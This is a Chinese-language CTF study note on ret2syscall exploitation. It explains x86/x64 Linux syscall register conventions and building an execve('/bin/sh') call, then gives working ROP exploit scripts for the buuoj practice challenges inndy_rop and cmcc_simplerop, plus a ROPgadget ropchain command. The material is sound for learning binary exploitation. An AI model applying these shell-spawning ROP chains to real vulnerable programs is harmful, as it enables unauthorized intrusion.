[关于系统调用如何传递参数问题，即系统调用约定（syscall，int 80h，svc）_int 80h intel汇编用法-CSDN博客](https://blog.csdn.net/weixin_45574485/article/details/106200229)

[ret2syscall的做题思路（以32位程序为例） - ZikH26 - 博客园 (cnblogs.com)](https://www.cnblogs.com/ZIKH26/articles/15851216.html)

主要是参数和调用号的传递

像ax这种的可以通过函数返回值来控制对应的值，比如**read**返回读取的字节数。



## 64位

**syscall**

syscall是64位的系统调用

调用号通过 **rax**传递

参数传递: **rdi**，**rsi**，**rdx**，**rcx**，**r8**，**r9**



## 32位

**int 80h**

调用号: **eax**

参数: **ebx**，**ecx**，**edx**，**esi**，**edi**



---

Intel 体系系统调用最多**6**个参数，都是通过寄存器传递，都不通过栈。

系统调用的返回结果在**ax**里



## Example

以32位为例

我们想调用

```c
execve("/bin/sh",NULL,NULL)
```

eax : execve的系统调用号 0xb

ebx :  第一个参数，指向`"/bin/sh"`的地址

ecx : 第二个参数，0

edx: 第三个参数，0



## 两种写入syscall参数的方法

具体的看上面的参考文章

**1. 利用寄存器pop**

```python
payload = p32(pop_ecx) + p32(bss) + p32(pop_[ecx]) + b'/bin'
payload += p32(pop_ecx) + p32(bss+4) + p32(pop_[ecx]) + b'/sh\x00'
```

查找 `[ecx]`gadget:

```bash
 ROPgadget --binary=./pwn | grep 'pop dword ptr \[ecx\]'
```



**2. 利用read函数**

将返回地址设置为read函数地址，然后找三个pop gadget来传read的三个参数。（32位，函数先传）



## 一些例题

具体分析看参考文章



[inndy_rop](https://buuoj.cn/challenges#inndy_rop)

```python
pop_eax_ret = 0x080b8016
pop_ebx_ret = 0x080481c9
pop_ecx_ret = 0x080de769
pop_edx_ret = 0x0806ecda
pop_ecx_mem_ret = 0x0804b5ba # [ecx]
int_0x80 = 0x0806c943

bss = 0x80EAF80


payload = b''
payload += b'a'*0xC + b'b'*4 + p32(pop_ecx_ret) + p32(bss) + p32(pop_ecx_mem_ret) + b'/bin' \
		 + p32(pop_ecx_ret) + p32(bss+4) + p32(pop_ecx_mem_ret) + b'/sh\x00'

payload += p32(pop_eax_ret) + p32(0xb) + p32(pop_ebx_ret) + p32(bss) + p32(pop_ecx_ret) + p32(0) + p32(pop_edx_ret) + p32(0) + p32(int_0x80)

sl(payload)

p.interactive()
```



[cmcc_simplerop](https://buuoj.cn/challenges#cmcc_simplerop)

```python
pop_eax_ret = 0x080bae06
pop_ebx_ret = 0x080481c9
pop_ecx_ebx_ret = 0x0806e851
pop_edx_ret = 0x0806e82a
int_0x80 = 0x080493e1
pop_edx_ecx_ebx_ret = 0x0806e850

offset = 0x20
read = 0x0806CD50
bss = 0x80EAF80

payload = b'a'*0x20 + p32(read) + p32(pop_edx_ecx_ebx_ret) # pop * 3
payload += p32(0) + p32(bss) + p32(8)
payload += p32(pop_eax_ret) + p32(11) + p32(pop_ebx_ret) + p32(bss) + p32(pop_ecx_ebx_ret) + p32(0) + p32(bss) + p32(pop_edx_ret) + p32(0) + p32(int_0x80)

sla("Your input :",payload)
sl(b'/bin/sh\x00')

p.interactive()
```



[picoctf_2018_can_you_gets_me](https://buuoj.cn/challenges#picoctf_2018_can_you_gets_me)

静态链接，ROPgadget生成ropchain:

```bash
ROPgadget --binary ./pwn --ropchain
```

